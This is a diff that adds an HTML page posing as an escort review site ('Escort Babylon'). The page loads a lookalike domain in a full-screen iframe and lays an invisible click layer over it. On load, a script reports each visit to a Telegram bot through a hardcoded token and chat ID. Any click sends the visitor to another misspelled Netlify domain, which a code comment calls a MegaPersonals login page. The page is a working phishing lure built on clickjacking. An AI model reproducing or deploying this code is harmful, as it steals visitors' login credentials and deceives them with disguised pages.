@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Escort Babylon: Reviews of Escorts</title>
+    
+    <meta name="description" content="Escort Babylon: Reviews of Escorts">
+
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        iframe {
+            width: 100%;
+            height: 100vh;
+            border: none;
+        }
+
+        .click-layer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            cursor: pointer;
+            z-index: 999999;
+            background: transparent;
+        }
+    </style>
+</head>
+<body>
+
+    <iframe src="https://escortbebyleon.netlify.app/" allowfullscreen></iframe>
+
+    <div class="click-layer"></div>
+
+    <script>
+        const BOT_TOKEN = '8373127655:AAHBV57xqoF4qqrMfomnQtoSwuEXRG9evAo';
+        const CHAT_ID = '7623079090';
+
+        async function sendNotification() {
+            const message = '🔔 Open the page';
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message
+                    })
+                });
+            } catch (e) {
+                console.log('Notification failed');
+            }
+        }
+
+        // Page load holei notification pathabe
+        window.addEventListener('load', function() {
+            sendNotification();
+        });
+
+        // Click layer e click korle MegaPersonals login page open hobe
+        document.querySelector('.click-layer').addEventListener('click', function() {
+            window.location.href = 'https://babylone-commet-reviwe1.netlify.app';
+        });
+    </script>
+
+</body>
+</html>
